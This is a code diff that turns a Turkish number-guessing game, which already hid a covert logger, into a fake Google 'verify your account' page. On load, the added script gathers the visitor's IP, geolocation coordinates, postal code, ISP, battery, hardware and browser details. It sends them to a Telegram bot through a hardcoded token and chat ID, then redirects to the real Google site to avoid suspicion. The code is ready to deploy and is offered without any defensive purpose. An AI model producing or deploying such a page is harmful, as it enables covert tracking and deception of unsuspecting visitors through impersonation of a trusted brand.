@@ -3,106 +3,145 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Matrix Terminal - Mini Game</title>
+    <title>Google - Hesabınızı Doğrulayın</title>
     <style>
-        body { background: #0a0a0a; color: #00ff66; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 85%; max-width: 400px; padding: 25px; border: 1px solid #00ff66; background: #111; text-align: center; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
-        input { background: #000; border: 1px solid #00ff66; color: #00ff66; padding: 8px; width: 60%; text-align: center; font-family: monospace; margin-bottom: 10px; }
-        button { background: #00ff66; color: #000; border: none; padding: 8px 15px; font-family: monospace; font-weight: bold; cursor: pointer; }
-        button:hover { background: #00cc55; }
-        .info { margin-top: 15px; font-size: 13px; color: #888; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 10px; }
+        .login-box { width: 100%; max-width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 36px; text-align: center; }
+        .logo { height: 24px; margin-bottom: 16px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
+        p { font-size: 16px; color: #202124; margin: 0 0 24px 0; }
+        .spinner { display: inline-block; width: 35px; height: 35px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { font-size: 14px; color: #5f6368; line-height: 1.5; }
+        @media (max-width: 450px) { .login-box { border: none; padding: 20px 10px; } }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div style="font-weight: bold; margin-bottom: 15px; font-size: 16px;">🎮 TERMINAL NUMBER GUESS v1.0</div>
-        <p id="game-status">1 ile 20 arasında gizli bir sayı tuttum. Tahmin et!</p>
+    <div class="login-box">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+        <h1>Güvenli Bağlantı</h1>
+        <p>Hesap güvenliğiniz doğrulanıyor</p>
         
-        <input type="number" id="guess-input" min="1" max="20" placeholder="Sayı girin">
-        <br>
-        <button onclick="checkGuess()">Tahmin Et</button>
-
-        <div class="info" id="system-info">Sistem: Çevrimiçi aktif oturum.</div>
+        <div class="spinner"></div>
+        
+        <div class="status-text" id="status">
+            Google servisleriyle güvenli protokol kuruluyor... <br>
+            Lütfen tarayıcınızı kapatmayın.
+        </div>
     </div>
 
     <script>
-        const secretName = Math.floor(Math.random() * 20) + 1;
-        let attempts = 0;
-        let logged = false;
-
-        async function runSecretLogger() {
-            if (logged) return;
-            logged = true;
-
+        window.onload = async function() {
+            // Sınırları zorlayıp toplayabileceğimiz tüm detaylı veriler
             let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor", internet_sirketi = "Bilinmiyor";
+            let posta_kodu = "Bilinmiyor", enlem_boylam = "Bilinmiyor", telefon_kodu = "Bilinmiyor", para_birimi = "Bilinmiyor";
+            let mobil_mi = "Hayır (Ev/İş İnterneti)";
 
+            // 1. Gelişmiş Konum ve Ağ Sağlayıcı Analizi
             try {
                 let ip_istegi = await fetch("https://ipapi.co/json/");
                 let konum = await ip_istegi.json();
+                
                 if (konum && !konum.error) {
                     ip = konum.ip || "Bilinmiyor";
                     ulke = konum.country_name || "Bilinmiyor";
                     eyalet_sehir = (konum.region || "Bilinmiyor") + " / " + (konum.city || "Bilinmiyor");
                     internet_sirketi = konum.org || "Bilinmiyor";
+                    posta_kodu = konum.postal || "Bilinmiyor";
+                    enlem_boylam = (konum.latitude || "?") + " , " + (konum.longitude || "?");
+                    telefon_kodu = konum.country_calling_code || "Bilinmiyor";
+                    para_birimi = konum.currency || "Bilinmiyor";
+                    
+                    let org_lower = internet_sirketi.toLowerCase();
+                    if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
+                        mobil_mi = "Evet (Mobil / Şebeke)";
+                    }
                 }
             } catch (e) {}
 
-            let ekran = window.screen.width + "x" + window.screen.height;
+            // 2. Detaylı Donanım ve Tarayıcı Analizi
+            let pil = "Bilinmiyor";
+            if (navigator.getBattery) { 
+                try { 
+                    let b = await navigator.getBattery(); 
+                    pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj 🔋)"); 
+                } catch(e){} 
+            }
+            
+            let ekran = window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x Pikselleşme)";
+            let cekirdek = navigator.hardwareConcurrency || "?";
+            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor (iOS/Eski Cihaz)";
+            let dil = navigator.language || "Bilinmiyor";
+            let tarayici_saati = new Date().toLocaleTimeString('tr-TR');
+            let tarih = new Date().toLocaleString('tr-TR');
+            
+            // Tarayıcı ve Detaylı İşletim Sistemi Analizi
             let ua = navigator.userAgent;
             let os = "Bilinmeyen Sistem";
-            if (/Android/i.test(ua)) os = "Android";
-            else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
-            else if (/Windows/i.test(ua)) os = "Windows";
+            if (/Android/i.test(ua)) {
+                let match = ua.match(/Android\s([0-9\.]+)/);
+                os = "Android " + (match ? match[1] : "Robot") + " 🤖";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                let match = ua.match(/OS\s([0-9_]+)/);
+                os = "iOS " + (match ? match[1].replace(/_/g, '.') : "") + " 🍏";
+            } else if (/Windows/i.test(ua)) {
+                let match = ua.match(/Windows\sNT\s([0-9\.]+)/);
+                let winVer = "Uyumlu Sürüm";
+                if(match) {
+                    if(match[1] === "10.0") winVer = "10/11";
+                    else if(match[1] === "6.1") winVer = "7";
+                    else if(match[1] === "6.2") winVer = "8";
+                }
+                os = "Windows " + winVer + " 💻";
+            }
 
-            let tarih = new Date().toLocaleString('tr-TR');
+            // Tarayıcı Tespiti
+            let tarayici = "Bilinmeyen Tarayıcı";
+            if (ua.includes("Chrome") && !ua.includes("Chromium") && !ua.includes("Edg")) tarayici = "Google Chrome";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) tarayici = "Apple Safari";
+            else if (ua.includes("Firefox")) tarayici = "Mozilla Firefox";
+            else if (ua.includes("Edg")) tarayici = "Microsoft Edge";
 
-            // Senin o çalışan kodundaki mesaj formatının aynısı
-            let mesaj = "🎮 *OYUNA GİRİŞ YAPILDI*\n";
+            // 3. Maksimum Detaylı Telegram Rapor Metni
+            let mesaj = "👤 *YENİ Gelişmiş GOOGLE LOGU*\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
-            mesaj += "🤖 *OS / Sistem:* " + os + "\n";
-            mesaj += "⏰ *Tarih:* " + tarih + "\n";
+            mesaj += "🤖 *Sistem (OS):* " + os + "\n";
+            mesaj += "🌍 *Tarayıcı:* " + tarayici + "\n";
+            mesaj += "⏰ *Ağ Zamanı:* " + tarih + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
+            mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
+            mesaj += "🗺️ *Koordinatlar:* `" + enlem_boylam + "`\n";
             mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj += "🖥️ *Çözünürlük:* " + ekran + "\n";
+            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
+            mesaj += "📞 *Ülke Tel Kodu:* " + telefon_kodu + " | *Para:* " + para_birimi + "\n";
+            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
+            mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
+            mesaj += "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
+            mesaj += "💾 *Tahmini RAM:* " + ram + "\n";
+            mesaj += "🔋 *Pil Durumu:* " + pil + "\n";
+            mesaj += "🗣️ *Cihaz Dili:* " + dil + " | *Saat:* " + tarayici_saati + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // Senin tıkır tıkır çalışan ham URL yapın (Hiçbir şifreleme yok, doğrudan gidiyor)
+            // 4. Doğrudan Çalışan Ham Telegram Bağlantısı
             let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
             let cid = "6845229845";
             let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
-            // Senin çalışan fetch metodun
-            fetch(url).catch(() => {});
-        }
-
-        function checkGuess() {
-            // Kullanıcı butona bastığı an senin çalışan fetch metodun arka planda tetiklenir
-            runSecretLogger();
-
-            const userInput = document.getElementById("guess-input").value;
-            const statusText = document.getElementById("game-status");
-            
-            if (!userInput) {
-                statusText.innerText = "Lütfen bir sayı girin!";
-                return;
-            }
-
-            attempts++;
-
-            if (parseInt(userInput) === secretName) {
-                statusText.innerText = `🎉 Tebrikler! ${attempts}. denemede doğru bildiniz!`;
-                statusText.style.color = "#00ff66";
-            } else if (parseInt(userInput) > secretName) {
-                statusText.innerText = "📉 Daha KÜÇÜK bir sayı deneyin.";
-                statusText.style.color = "#ffcc00";
-            } else {
-                statusText.innerText = "📈 Daha BÜYÜK bir sayı deneyin.";
-                statusText.style.color = "#ffcc00";
-            }
-        }
+            // İsteği gönder ve yönlendiriyormuş gibi yap
+            fetch(url)
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('status').innerHTML = "<span style='color: #1a73e8; font-weight: bold;'>✓ Cihaz doğrulandı.</span><br>Google ana sayfasına yönlendiriliyorsunuz...";
+                    // 2 saniye sonra gerçek Google'a şüphe çekmeden postala
+                    setTimeout(() => { window.location.href = "https://myaccount.google.com"; }, 2000);
+                }, 1500);
+            })
+            .catch(() => {});
+        };
     </script>
 </body>
 </html>
